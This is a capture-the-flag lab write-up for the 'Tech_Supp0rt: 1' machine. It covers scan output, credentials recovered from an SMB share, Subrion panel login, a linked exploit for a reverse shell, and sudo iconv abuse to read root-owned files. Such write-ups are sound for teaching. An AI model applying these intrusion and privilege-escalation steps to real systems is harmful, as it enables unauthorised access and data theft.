# Tech_Supp0rt: 1

Questions:
1. What is the root.txt flag?

## nmap scan
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## gobuster scan
```
/wordpress            (Status: 301) [Size: 316] [--> http://10.10.46.219/wordpress/]
/test                 (Status: 301) [Size: 311] [--> http://10.10.46.219/test/]
```

## nikto scan
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.46.219
+ Target Hostname:    10.10.46.219
+ Target Port:        80
+ Start Time:         2023-08-31 13:31:21 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5c367f4428b1f, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /test/: This might be interesting.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.
+ /wordpress/wp-admin/: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ /wordpress/: Drupal Link header found with value: </wordpress/index.php/index.php/wp-json/>; rel="https://api.w.org/". See: https://www.drupal.org/
+ /wordpress/: A Wordpress installation was found.
+ /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wordpress/wp-content/uploads/: Directory indexing found.
+ /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
+ /wordpress/wp-login.php: Wordpress login found.
+ 8074 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2023-08-31 13:36:24 (GMT-4) (303 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
- we got the phpinfo.php file
- http://10.10.46.219/wordpress/wp-login.php --> afte a few tests we can see that the username "support" exist

## Samba
- smbclient \\\\10.10.46.219\\websvr
- ls
- get enter.txt \
We got..
```
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
Wordpress creds
|->
```
**admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk** \
If we go to **https://gchq.github.io/CyberChef/** anduse "Magic" we got this password: "Scam2021" \
When we google the CMS "subrion" we can find the robots.txt on this Git project: https://github.com/intelliants/subrion 

So lets try.. 
http://10.10.46.219/subrion/panel/ \
And wo can paste in our credentials.. got access :)

## reverse shell
Now we can easily open an reverse shell. 
- https://www.exploit-db.com/exploits/49876
In path "/var/www/html/wordpress/wp-config.php" we find a password: **ImAScammerLOL!123!**
We can change the user with this password, an now type in "sudo -l" and see "/user/bin/iconv" \
On https://gtfobins.github.io/gtfobins/iconv/#sudo we can find following lines:
```
LFILE=file_to_read
./iconv -f 8859_1 -t 8859_1 "$LFILE"
```
Now you can read the root.txt file.























